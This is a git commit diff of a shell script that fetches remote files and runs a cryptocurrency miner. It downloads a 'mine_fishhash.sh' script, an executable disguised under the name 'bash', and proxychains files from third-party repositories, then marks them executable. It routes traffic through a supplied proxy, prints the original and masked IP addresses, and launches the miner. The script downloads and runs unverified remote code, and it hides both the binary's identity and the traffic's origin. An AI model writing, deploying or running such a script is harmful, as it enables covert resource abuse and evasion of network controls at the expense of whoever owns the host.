6b5012cc3d13872f32b73a29cc6cba6a21e12726
pagesrlepla <151825393+pagesrlepla@users.noreply.github.com>
2024-03-12 12:55:04 +0700

    Update and rename fishh.sh to fushh.sh

--- fushh.sh
+++ fushh.sh
@@ -19,10 +19,10 @@ apt-get update && apt-get install -y \
  && mkdir -p /home/stuff
 apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 echo "Uploaded files:" && ls /home/stuff/
-wget -q https://raw.githubusercontent.com/pagesrlepla/mx8/main/mine_fishhash.sh && chmod +x mine_fishhash.sh
-wget -q https://github.com/pagesrlepla/mx8/blob/main/bash && chmod +x bash
-wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
-wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
+wget https://raw.githubusercontent.com/pagesrlepla/mx8/main/mine_fishhash.sh && chmod +x mine_fishhash.sh
+wget https://github.com/pagesrlepla/mx8/blob/main/bash && chmod +x bash
+wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
+wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
 sleep 3 
 sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
 sleep 1 
@@ -35,6 +35,6 @@ echo "******************************************************************"
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " " 
 echo " " 
-echo "IP BARU ==> "$(./panel curl ifconfig.me)
+echo "IP BARU ==> "$(./bash curl ifconfig.me)
 ./mine_fishhash.sh
 
